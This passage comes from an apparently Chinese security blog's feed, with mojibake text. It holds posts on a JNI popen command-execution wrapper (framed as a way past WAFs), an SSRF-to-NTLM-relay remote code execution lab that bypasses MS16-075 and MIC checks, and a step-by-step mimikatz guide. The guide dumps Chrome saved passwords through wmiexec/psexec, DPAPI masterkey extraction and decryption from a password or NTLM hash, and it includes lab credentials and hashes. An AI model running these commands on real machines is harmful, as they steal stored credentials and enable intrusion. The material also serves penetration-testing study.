name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(Integer age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œä¸ºäº†æµ‹è¯•æ–¹ä¾¿æŠŠc/sæ”¾åˆ°ä¸€èµ·äº†<br><img src="1578060757509-0a3de905-6438-4bea-bfab-f18df997a87a.png" alt="image.png"></p>
<h3 id="è¿›è¡ŒRPC"><a href="#è¿›è¡ŒRPC" class="headerlink" title="è¿›è¡ŒRPC"></a>è¿›è¡ŒRPC</h3><p><img src="1578060910923-4235fecb-4e57-4c19-990c-5ea3502505a5.png" alt="image.png"></p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://blog.csdn.net/mahoking/article/details/51704966">Hessianä½¿ç”¨æ•™ç¨‹</a><br><a href="https://juejin.im/entry/595996e25188250d8324118d">JVM ç±»è£…è½½åŸç†åˆ†æï¼ClassLoaderåŸç†åˆ†æ</a><br><a href="https://www.iteye.com/topic/245238">hessian åºåˆ—åŒ–å®ç° åˆæ¢</a></p>
]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA JNI æ‰§è¡Œå‘½ä»¤ä¸è°ƒè¯•</title>
    <url>/2019/12/31/JAVA-JNI-%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E4%B8%8E%E8%B0%83%E8%AF%95/</url>
    <content><![CDATA[<!-- JNIæ˜¯Java Native Interfaceçš„ç¼©å†™ï¼Œåˆ©ç”¨å®ƒå¯ä»¥åœ¨æ¯”è¾ƒåº•å±‚çš„ä½ç½®æ‰§è¡Œå‘½ä»¤ã€‚ -->
<!-- more -->
<h1 id="JAVA-JNI-æ‰§è¡Œå‘½ä»¤ä¸è°ƒè¯•"><a href="#JAVA-JNI-æ‰§è¡Œå‘½ä»¤ä¸è°ƒè¯•" class="headerlink" title="JAVA JNI æ‰§è¡Œå‘½ä»¤ä¸è°ƒè¯•"></a>JAVA JNI æ‰§è¡Œå‘½ä»¤ä¸è°ƒè¯•</h1><p><a name="ipGc8"></a></p>
<h2 id="æ‰§è¡Œå‘½ä»¤"><a href="#æ‰§è¡Œå‘½ä»¤" class="headerlink" title="æ‰§è¡Œå‘½ä»¤"></a>æ‰§è¡Œå‘½ä»¤</h2><p>ä»£ç åŸºæœ¬æŠ„è‡ªè‡ªå›­é•¿çš„demoï¼ˆä¸ºäº†ç¯‡å¹…çœç•¥äº†ä½œè€…ä¿¡æ¯ï¼Œè¿™é‡Œç»Ÿä¸€è¯´æ˜ä¸€ä¸‹ï½ï¼‰</p>
<p>JNIçš„å¥½å¤„åœ¨äºåº•å±‚ï¼Œå®æˆ˜ä¸­å¯ç”¨ç»•è¿‡ä¸€äº›wafæ‹¦æˆªå§ã€‚</p>
<p>CommandExecution.java</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommandExecution</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> native String <span class="title">exec</span><span class="params">(String cmd)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç¼–è¯‘CommandExecutionï¼Œå¹¶ç”Ÿæˆnativeå±‚cä»£ç éœ€è¦ç”¨çš„å¤´æ–‡ä»¶</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">javac -cp . CommandExecution.java</span><br><span class="line">javah -cp . CommandExecution</span><br></pre></td></tr></table></figure>

<p>CommandExecution.cpp</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"CommandExecution.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line">JNIEXPORT jstring</span><br><span class="line"></span><br><span class="line">JNICALL CommandExecution_exec</span><br><span class="line">        (JNIEnv *env, jclass jclass, jstring str) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (str != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        jboolean jsCopy;</span><br><span class="line">        <span class="comment">// å°†jstringå‚æ•°è½¬æˆcharæŒ‡é’ˆ</span></span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">char</span> *cmd = env-&gt;GetStringUTFChars(str, &amp;jsCopy);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä½¿ç”¨popenå‡½æ•°æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</span></span><br><span class="line">        FILE *fd  = popen(cmd, <span class="string">"r"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (fd != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="comment">// è¿”å›ç»“æœå­—ç¬¦ä¸²</span></span><br><span class="line">            <span class="built_in">string</span> result;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// å®šä¹‰å­—ç¬¦ä¸²æ•°ç»„</span></span><br><span class="line">            <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// è¯»å–popenå‡½æ•°çš„æ‰§è¡Œç»“æœ</span></span><br><span class="line">            <span class="keyword">while</span> (fgets(buf, <span class="keyword">sizeof</span>(buf), fd) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="comment">// æ‹¼æ¥è¯»å–åˆ°çš„ç»“æœåˆ°result</span></span><br><span class="line">                result +=buf;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// å…³é—­popen</span></span><br><span class="line">            pclose(fd);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// è¿”å›å‘½ä»¤æ‰§è¡Œç»“æœç»™Java</span></span><br><span class="line">            <span class="keyword">return</span> env-&gt;NewStringUTF(result.c_str());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç¼–è¯‘ï¼Œæ³¨æ„è¿™é‡Œä¸ºäº†åç»­èƒ½å¤Ÿè°ƒè¯•éœ€è¦åŠ  <code>-g</code> å‚æ•°</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">g++ -fPIC -I<span class="string">"$JAVA_HOME/include"</span> -I<span class="string">"$JAVA_HOME/include/linux"</span> -shared -g -o libcmd.so CommandExecution.cpp</span><br></pre></td></tr></table></figure>

<p>MainTest.java</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainTest</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.load(<span class="string">"/home/anonymous/Desktop/learnjni/libcmd.so"</span>);</span><br><span class="line">        CommandExecution commandExecution = <span class="keyword">new</span> CommandExecution();</span><br><span class="line">        System.out.println(commandExecution.exec(<span class="string">"whoami"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">javac MainTest.java</span><br><span class="line">java MainTest</span><br></pre></td></tr></table></figure>

<p><img src="1577718523328-184106f3-09eb-46c1-bf96-43a560463d68.png" alt=""></p>
<p><a name="GgaID"></a></p>
<h2 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h2><p>è°ƒè¯•éœ€è¦åŒæ—¶å®‰è£…JetBrainå®¶çš„ideaå’Œclionï¼Œå¹¶ä¸”clionè¦ä»¥ç®¡ç†å‘˜æƒé™ï¼ˆsudoï¼‰å¯åŠ¨ã€‚</p>
<ul>
<li>åœ¨è°ƒç”¨nativeå±‚çš„åœ°æ–¹æ‰“æ–­ç‚¹</li>
<li>é€šè¿‡jpsæ‰¾åˆ°æ‰€è¿è¡Œçš„javaç±»å¯¹åº”çš„ç±»çš„ç¼–å·</li>
<li>åœ¨clioné€‰æ‹©Run-&gt;Attach to Process ç„¶åattachåˆ°å“åº”ç¼–å·ä¸Š</li>
<li>åœ¨ä¸‹æ–­ç‚¹åœ°æ–¹æ­¥å…¥</li>
</ul>
<p><img src="1577718596131-2f54a43f-5d26-4aad-ae09-294069574301.png" alt=""></p>
<p>æ­¥è¿‡findNativeåå°±ä¼šè·³è½¬åˆ°clioné‡Œé¢ç„¶åå°±å¯ä»¥æ„‰å¿«çš„è°ƒè¯•äº†ï½<br /><img src="1577718822468-c0f6a1cf-2889-4539-aebe-aa0cda8fdd0a.png" alt=""><br><a name="0XEa5"></a></p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://www.youtube.com/watch?v=8Cjeq4l5COU">recipeNoD002 - Debugging JNI code with IntelliJ/CLion</a><br /><a href="https://www.jianshu.com/p/8c510102e879">IntellJ IDEAä¸­JNIå•æ­¥è°ƒè¯•æŒ‡å—</a><br /><a href="https://javasec.org/javase/JNI/">JNIå®‰å…¨åŸºç¡€</a></p>
]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>åšå®¢é‡å¯å°è®°</title>
    <url>/2019/12/22/%E5%8D%9A%E5%AE%A2%E9%87%8D%E5%90%AF%E5%B0%8F%E8%AE%B0/</url>
    <content><![CDATA[<p>å¤§çº¦æ˜¯åœ¨ä¸€ä¸ƒå¹´é‚£ä¸ªå¯’å‡å¼€å§‹å†™æŠ€æœ¯åšå®¢ï¼Œä¸­é—´æ–­æ–­ç»­ç»­çš„æ›´æ–°åˆ°ä¸€å…«å¹´å…­æœˆã€‚é‡æ–°å†™åšå®¢æ˜¯èµ·äºä»Šå¹´ä¹æœˆä»½çš„ä¸´æ—¶èµ·æ„ï¼Œä¸€æ–¹é¢æ˜¯æƒ³ç£ä¿ƒè‡ªå·±â€œæœ‰æ„è¯†â€çš„è¿›æ­¥ï¼Œå¦å¤–ä¸€æ–¹é¢æ˜¯å‡è£…åšåšæŠ€æœ¯è¾“å‡ºã€‚æœ€å¼€å§‹åšå®¢ç”¨çš„æ˜¯hexoï¼Œé‡å¯ä¹‹åå¦èµ·ç‚‰ç¶ç”¨æ˜¯wordpressï¼Œå› ä¸ºå¹¶ä¸æƒ³ä»˜äº‘æœåŠ¡å™¨æœˆç§Ÿæ‰€ä»¥å†³å®šæ¢å›hexoã€‚åœ¨å¼ƒæ›´åˆ°é‡å¯è¿™æ®µæœŸé—´å› ä¸ºæ¢è¿‡æ–°ç¬”è®°æœ¬å¹¶ä¸”å†åŠ ä¸Šæ²¡æœ‰å¤‡ä»½ï¼Œæ‰€ä»¥ä¹‹å‰çš„åšå®¢æ–‡ç« çš„mdç‰ˆå·²ç»ç¾éš¾æ€§çš„æ¶ˆå¤±ã€‚å¤§çº¦èŠ±äº†ä¸€å¤©å¤šçš„æ—¶é—´æ…¢æ…¢æŠŠç½‘é¡µæ‰‹å·¥æ¢å¤æˆç¬¦åˆhexoæ ¼å¼çš„mdï¼ˆå¤§æ¦‚éƒ¨åˆ†æ–‡ç« ä»ç„¶ä¼šæœ‰æ ¼å¼ä¸Šçš„é”™è¯¯ï¼‰ï¼Œåœ¨æ•´ç†çš„æ—¶å€™å‘ç°è‡ªå·±ä»¥å‰çš„æ–‡ç« è¡¨æ„ä¸æ¸…ï¼Œéƒ¨åˆ†åœ°æ–¹æ˜¯ç‰‡é¢ç”šè‡³é”™è¯¯çš„ï¼ˆä»¥åæŠ½æ—¶é—´æ…¢æ…¢æ”¹ï¼Œå’•å’•å’•ï¼Ÿï¼‰ã€‚ä»¥ä¸Šï½</p>
]]></content>
      <tags>
        <tag>æ‚</tag>
      </tags>
  </entry>
  <entry>
    <title>Using Java&#39;s SSRF vulnerability rce via ntlm relay</title>
    <url>/2019/12/19/Using%20Java%E2%80%99s%20SSRF%20vulnerability%20rce%20via%20ntlm%20relay/</url>
    <content><![CDATA[<!-- ç»•è¿‡ MS16-075 å’Œ MICæ ¡éªŒè¿›è¡Œntlm relay -->
<!-- more -->

<h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>å®éªŒå®¤ç¯å¢ƒè¯´æ˜<br>â€¢ 6.1.7601 Service Pack 1 Build 7601<br>â€¢ jdk1.7.0_80<br>â€¢ å·¥ä½œç»„ç¯å¢ƒ</p>
<p>å®éªŒä»£ç </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.io.BufferedReader"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.io.IOException"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.io.InputStreamReader"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.net.URL"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.net.URLConnection"</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String ssrf = request.getParameter(<span class="string">"ssrf"</span>);</span><br><span class="line">    URL url = <span class="keyword">new</span> URL(ssrf);</span><br><span class="line">    URLConnection connection = url.openConnection();</span><br><span class="line">    connection.setRequestProperty(<span class="string">"user-agent"</span>, <span class="string">"javasec"</span>);</span><br><span class="line">    connection.setConnectTimeout(<span class="number">1000</span>);</span><br><span class="line">    connection.setReadTimeout(<span class="number">1000</span>);</span><br><span class="line">    connection.connect();</span><br><span class="line">    connection.getHeaderFields();</span><br><span class="line">    connection.getInputStream();</span><br><span class="line">    StringBuilder resp = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    BufferedReader in = <span class="keyword">new</span> BufferedReader(</span><br><span class="line">            <span class="keyword">new</span> InputStreamReader(connection.getInputStream()));</span><br><span class="line">    String line;</span><br><span class="line">    <span class="keyword">while</span> ((line = in.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        resp.append(<span class="string">"/n"</span>).append(line);</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.print(resp.toString());</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>ä½¿ç”¨<a href="https://github.com/5alt/ultrarelay">ultrarelay</a>ç›‘å¬ç«¯å£ï¼Œè®¿é—®url <code>http://172.16.247.130:8888/ssrf.jsp?ssrf=http://172.16.247.1</code>è§¦å‘ssrfæ¼æ´æ—¶å¯ä»¥çœ‹åˆ°å·²ç»æŠŠå—å®³æœºçš„ntlm hashæ‹¿åˆ°äº†ã€‚<br><img src="./1576766596365.png" alt="Alt text"></p>
<h2 id="åŸç†åˆ†æ"><a href="#åŸç†åˆ†æ" class="headerlink" title="åŸç†åˆ†æ"></a>åŸç†åˆ†æ</h2><p>æœ¬è´¨ä¸Šå°±æ˜¯ä¸€æ¬¡ä»httpåˆ°smbè·¨åè®®ntlm relayæœ¬æœºï¼Œä½†æ˜¯æˆ‘ä»¬çŸ¥é“åœ¨ MS16-075ä¹‹åå¾®è½¯ä¿®å¤äº†http-&gt;smbçš„æœ¬æœºrelayã€‚æ‰€ä»¥ä¸ºäº†ç»•è¿‡è¿™ä¸ªé™åˆ¶éœ€è¦å°†type2(NTLMSSP_CHALLENGE)Negotiate Flagsä¸­çš„0x00004000è®¾ç½®ä¸º0ï¼Œä½†æ˜¯è®¾ç½®ä¸º0åä¼šå‡ºç°å¦å¤–ä¸€ä¸ªé—®é¢˜é‚£å°±æ˜¯MICéªŒè¯ä¼šä¸é€šè¿‡ï¼Œä¸ºäº†ç»•è¿‡è¿™ä¸ªé™åˆ¶åˆéœ€è¦æŠŠtype2 Negotiate Flagsä¸­çš„Negotiate Always Signè®¾ç½®ä¸º0ã€‚</p>
<p>å“åº”victim401å¹¶å¼€å¯ntlmè®¤è¯<br><img src="./1576766618381.png" alt="Alt text"></p>
<p>victom -&gt; http NTLMSSP_NEGOTIATE -&gt; hacker<br><img src="./1576766644960.png" alt="Alt text"></p>
<p>hacker -&gt; smb NTLMSSP_NEGOTIATE -&gt; victim<br><img src="./1576766672332.png" alt="Alt text"></p>
<p>victim-&gt;smb NTLMSSP_CHALLENGE -&gt; hacker<br><img src="./1576766704445.png" alt="Alt text"></p>
<p>hacker-&gt;http NTLMSSP_CHALLENGE -&gt; victimï¼Œé‡ç‚¹å°±åœ¨è¿™æ­¥åœ¨ç»™victimçš„httpåº”ç­”ä¸­å°†0x00004000å’ŒNegotiate Always Signéƒ½è®¾ç½®ä¸ºäº†0ã€‚<br><img src="./1576766730695.png" alt="Alt text"></p>
<p>victim-&gt; http NTLMSSP_AUTH -&gt;hacker<br><img src="./1576766771275.png" alt="Alt text"></p>
<p>hacker-&gt; smb NTLMSSP_AUTH -&gt;victim<br><img src="./1576766793902.png" alt="Alt text"></p>
<p>åé¢è®¤è¯æˆåŠŸåï¼Œå“åº”victim 404ï¼Œå¹¶è¿æ¥victimçš„IPC$è¿›è¡Œåç»­rceæ“ä½œã€‚<br><img src="./1576766820232.png" alt="Alt text"></p>
<h2 id="æˆåŠŸæ¡ä»¶"><a href="#æˆåŠŸæ¡ä»¶" class="headerlink" title="æˆåŠŸæ¡ä»¶"></a>æˆåŠŸæ¡ä»¶</h2><p>â€¢ http-&gt;smbæœªæ‰“æ–°è¡¥ä¸<br>â€¢ å·¥ä½œæ¡ä»¶ç¯å¢ƒä¸‹éœ€è¦administratorï¼ˆsid 500ï¼‰<br>â€¢ ä¸€ä¸ªssrfæˆ–è€…xxeçš„ç‚¹</p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p>Ntlm Relay is dead, Long Live Ntlm Relay<br>Ntlm-Relay-Reloaded-Attack-methods-you-do-not-know<br>ntlmrelay</p>
]]></content>
      <categories>
        <category>windows security</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>ä½¿ç”¨mimikatzå¯¼å‡ºchromeå¯†ç </title>
    <url>/2019/12/09/%E4%BD%BF%E7%94%A8mimikatz%E5%AF%BC%E5%87%BAchrome%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[<!-- åœ¨å„ç§åœºæ™¯ä¸‹ä½¿ç”¨mimikatzå¯¼å‡ºchromeçš„å§¿åŠ¿ -->
<!-- more -->

<h2 id="æ¨¡æ‹Ÿåœºæ™¯"><a href="#æ¨¡æ‹Ÿåœºæ™¯" class="headerlink" title="æ¨¡æ‹Ÿåœºæ™¯"></a>æ¨¡æ‹Ÿåœºæ™¯</h2><p>åœ¨è·å–æŸPCæœ¬åœ°administratorçš„æƒé™æƒ…å†µä¸‹ï¼Œå¯¼å‡ºä½¿ç”¨è¯¥PCæœºåŸŸæ™®é€šè´¦å·çš„å¯†ç ã€‚</p>
<p>å—å®³æœºipï¼š192.168.3.4</p>
<p>å—å®³æœºè´¦æˆ·ï¼š</p>
<ul>
<li>æœ¬åœ°ç®¡ç†å‘˜ï¼šadministrator/toor</li>
<li>åŸŸæ™®é€šè´¦æˆ·ï¼šbeta\fengjie/qqq123!@#</li>
</ul>
<h2 id="åŠ å¯†æœºåˆ¶ç®€ä»‹"><a href="#åŠ å¯†æœºåˆ¶ç®€ä»‹" class="headerlink" title="åŠ å¯†æœºåˆ¶ç®€ä»‹"></a>åŠ å¯†æœºåˆ¶ç®€ä»‹</h2><p>chromeå‚¨å­˜çš„æ˜æ–‡å¯†ç æ—¶ä½¿ç”¨windowsæä¾›çš„DPAPIè¿›è¡Œå¯¹ç§°åŠ å¯†æ¥ä¿è¯å®‰å…¨æ€§ã€‚åŠ è§£å¯†çš„å¯†é’¥ç§°ä¸ºmaster keyã€‚master keyè¢«ç”¨æˆ·ç™»å½•å¯†ç ã€SIDå’Œ16å­—èŠ‚éšæœºæ•°åŠ å¯†åä¿å­˜åœ¨Master Key fileï¼ˆ<code>%APPDATA%\Microsoft\Protect\%SID%</code>ï¼‰ä¸­ã€‚</p>
<h2 id="æœ€ç®€å•çš„æƒ…å†µï¼šAç”¨æˆ·æ‹–Aè‡ªå·±çš„å¯†ç "><a href="#æœ€ç®€å•çš„æƒ…å†µï¼šAç”¨æˆ·æ‹–Aè‡ªå·±çš„å¯†ç " class="headerlink" title="æœ€ç®€å•çš„æƒ…å†µï¼šAç”¨æˆ·æ‹–Aè‡ªå·±çš„å¯†ç "></a>æœ€ç®€å•çš„æƒ…å†µï¼šAç”¨æˆ·æ‹–Aè‡ªå·±çš„å¯†ç </h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dpapi::chrome &#x2F;in:&#39;C:\Users\fengjie\AppData\Local\Google\Chrome\User</span><br><span class="line">Data\Default\Login Data&#39; &#x2F;unprotect</span><br></pre></td></tr></table></figure>

<h2 id="åœ¨Aç”¨æˆ·ç™»é™†çŠ¶æ€Bè§£å¯†Açš„chromeå¯†ç "><a href="#åœ¨Aç”¨æˆ·ç™»é™†çŠ¶æ€Bè§£å¯†Açš„chromeå¯†ç " class="headerlink" title="åœ¨Aç”¨æˆ·ç™»é™†çŠ¶æ€Bè§£å¯†Açš„chromeå¯†ç "></a>åœ¨Aç”¨æˆ·ç™»é™†çŠ¶æ€Bè§£å¯†Açš„chromeå¯†ç </h2><p>åœ¨ç”¨æˆ·ç™»é™†çŠ¶æ€ä¸‹å¯ä»¥ç›´æ¥ç”¨procdumpæˆ–è€…mimikatzç›´æ¥ä»å†…å­˜ä¸­è·å–master keyã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::dpapi</span><br><span class="line"></span><br><span class="line">python wmiexec.py administrator:toor@192.168.3.4 &#39;c:\users\public\mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::dpapi&quot; exit&#39;</span><br></pre></td></tr></table></figure>
<p><img src="./1575901995739.png" alt="Alt text"></p>
<p>è·å–åˆ°masterkey</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0bf0be64d4dc768a543b3a12d7c5210d184c07a3861cad8f2bd8b7bbacc60fd0e06e955b6dad057d070d1ce3b2bb331fd8dbce6efad08808f1849e4f4ef26d80</span><br><span class="line"></span><br><span class="line">1b81b1c9cb66a3f93b58f85948e8ce53779c6e5d</span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥ç”¨mimikatzä¸€æŠŠæ¢­å°±å¯ä»¥äº†</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python wmiexec.py administrator:toor@192.168.3.4 &#39;cd c:\users\public &amp;&amp; Minimimini64.exe &quot;dpapi::chrome &#x2F;in:\&quot;C:\Users\fengjie\AppData\Local\Google\Chrome\User Data\Default\Login Data\&quot; &#x2F;masterkey:1b81b1c9cb66a3f93b58f85948e8ce53779c6e5d&quot; exit &#39;</span><br></pre></td></tr></table></figure>
<p>æœ€å¼€å§‹ç”¨wmiexecå¹¶æœªè§£å¯†æˆåŠŸ<br><img src="./1575902015580.png" alt="Alt text"></p>
<p>åæ¥å‘ç°æ˜¯wmiexecçš„é”…æ¢æˆpsexecå°±å¥½äº†ï¼ˆ<strong>ç”¨smbexecä¹Ÿå¯ä»¥ï¼Œæ€€ç–‘æ˜¯å› ä¸ºç”¨wmiexecæ—¶ä»¤ç‰Œå®Œæ•´æ€§å—é™çš„åŸå› ï¼ŒçŸ¥é“çš„å¸ˆå‚…è¯·æ•™æˆ‘ä¸€æ‰‹</strong>ï¼‰<br><img src="./1575902027549.png" alt="Alt text"></p>
<h2 id="åœ¨Aç”¨æˆ·ç¦»çº¿çŠ¶æ€Bè§£å¯†Açš„chromeå¯†ç "><a href="#åœ¨Aç”¨æˆ·ç¦»çº¿çŠ¶æ€Bè§£å¯†Açš„chromeå¯†ç " class="headerlink" title="åœ¨Aç”¨æˆ·ç¦»çº¿çŠ¶æ€Bè§£å¯†Açš„chromeå¯†ç "></a>åœ¨Aç”¨æˆ·ç¦»çº¿çŠ¶æ€Bè§£å¯†Açš„chromeå¯†ç </h2><p>ç°åœ¨ç”¨mimikatzé‡æ–°æŠ“å·²ç»æŠ“ä¸åˆ°fengjieçš„master keyäº†<br><img src="./1575902048343.png" alt="Alt text"></p>
<h3 id="ç”¨æˆ·æ˜æ–‡å¯†ç å·²çŸ¥"><a href="#ç”¨æˆ·æ˜æ–‡å¯†ç å·²çŸ¥" class="headerlink" title="ç”¨æˆ·æ˜æ–‡å¯†ç å·²çŸ¥"></a>ç”¨æˆ·æ˜æ–‡å¯†ç å·²çŸ¥</h3><p>è¿™ç§æƒ…å†µä¸‹æœ‰ä¸¤ç§æ–¹æ³•å¯ä»¥é€‰æ‹©ã€‚</p>
<p>1.å¦‚æœæˆ‘ä»¬çŸ¥é“fengjieçš„æ˜æ–‡å¯†ç ï¼Œå¯ä»¥ç”¨runasé™æƒ(æˆ–è€…è¿›è¡Œä¸€äº›spwançš„æ“ä½œé™æƒ)ï¼Œé™æƒä¹‹ååˆå›åˆ°äº†æœ€ç®€å•çš„æƒ…å†µã€‚ï¼ˆå› ä¸ºrunaséœ€è¦äº¤äº’å¼shellï¼Œæ‰€ä»¥è¿™ç§æ–¹æ³•æ¯”è¾ƒé¸¡è‚‹ï¼‰</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">runas &#x2F;user:fengjie@beta.com &quot;cmd.exe&quot;</span><br><span class="line"></span><br><span class="line">mimikatz dpapi::chrome &#x2F;in:â€%localappdata%\Google\Chrome\User Data\Default\Cookiesâ€ &#x2F;unprotect</span><br></pre></td></tr></table></figure>

<p>2.åœ¨æ²¡æœ‰äº¤äº’å¼çš„æƒ…å†µä¸‹å¯ä»¥ç›´æ¥ç”¨mimikatzç›´æ¥ç®—å‡º<code>master key</code>ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dpapi::masterkey &#x2F;in:&quot;c:\Users\fengjie\AppData\Roaming\Microsoft\Protect\S-1-5-21-2274946182-2013957047-1890316882-1632\59a94dbc-6dbb-4d51-bec0-edebc6f2e9f8&quot; &#x2F;password:qqq123!@#</span><br></pre></td></tr></table></figure>
<p><img src="./1575902064361.png" alt="Alt text"></p>
<p>æ‹¿åˆ°master keyåæƒ…å†µåˆç›¸å½“äºåˆè½¬æ¢å›äº†ç”¨æˆ·åœ¨çº¿çš„æƒ…æ™¯ã€‚</p>
<h3 id="ç”¨æˆ·æ˜æ–‡å¯†ç æœªçŸ¥ï¼ŒçŸ¥é“NTLM-hash"><a href="#ç”¨æˆ·æ˜æ–‡å¯†ç æœªçŸ¥ï¼ŒçŸ¥é“NTLM-hash" class="headerlink" title="ç”¨æˆ·æ˜æ–‡å¯†ç æœªçŸ¥ï¼ŒçŸ¥é“NTLM hash"></a>ç”¨æˆ·æ˜æ–‡å¯†ç æœªçŸ¥ï¼ŒçŸ¥é“NTLM hash</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dpapi::masterkey &#x2F;in:&quot;c:\Users\fengjie\AppData\Roaming\Microsoft\Protect\S-1-5-21-2274946182-2013957047-1890316882-1632\59a94dbc-6dbb-4d51-bec0-edebc6f2e9f8&quot; &#x2F;hash:632f6adad4510099d676724bfb87c6ee</span><br></pre></td></tr></table></figure>
<p><img src="./1575902075847.png" alt="Alt text"></p>
